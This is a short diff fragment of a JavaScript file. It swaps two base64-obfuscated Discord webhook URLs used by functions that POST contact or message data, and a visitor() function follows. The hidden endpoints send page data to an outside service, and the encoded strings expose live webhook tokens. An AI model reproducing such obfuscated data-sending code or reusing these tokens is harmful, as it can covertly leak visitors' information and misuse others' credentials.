@@ -83,7 +83,7 @@ function sendContact(url)
 `;
     if (name != undefined) {
       var xhr = new XMLHttpRequest();
-      xhr.open("POST", def("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTIxMzQ5ODkxMzE1MjMwMzE5NC9lZE4yRDgtZy1zZVpkODVHdWNGeG5jeHZxanVUbjVNX1hIaWw2OUxqdXhfaENuUEl0aUZ3cm5xbU4tSjNGYTk1RlVzTg=="), true);
+      xhr.open("POST", atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTIxMzUwMTA3MjY3MzM0MTQ5MC9ZcWtkWXhyR213WmRTei1Db1VwYTVrRVR6ZU5yd3duTlROYjNVSlhYdklwcmJDMDQ2M3RkeW9kWDdFZTI5YjhIRktCMA=="), true);
       xhr.setRequestHeader('Content-Type', 'application/json');
       xhr.send(JSON.stringify({
         'content': output,
@@ -95,7 +95,7 @@ function sendContact(url)
 function sendMessage(text) {
 	let user = {content: text};
 	let options = {method: 'POST', body: JSON.stringify(user), headers: {'Content-Type': 'application/json'}}
-	fetch(atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTIxMzUwMTA3MjY3MzM0MTQ5MC9ZcWtkWXhyR213WmRTei1Db1VwYTVrRVR6ZU5yd3duTlROYjNVSlhYdklwcmJDMDQ2M3RkeW9kWDdFZTI5YjhIRktCMA=="), options)
+	fetch(atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTIxMzQ5ODkxMzE1MjMwMzE5NC9lZE4yRDgtZy1zZVpkODVHdWNGeG5jeHZxanVUbjVNX1hIaWw2OUxqdXhfaENuUEl0aUZ3cm5xbU4tSjNGYTk1RlVzTg=="), options)
 } 
 
 function visitor() {
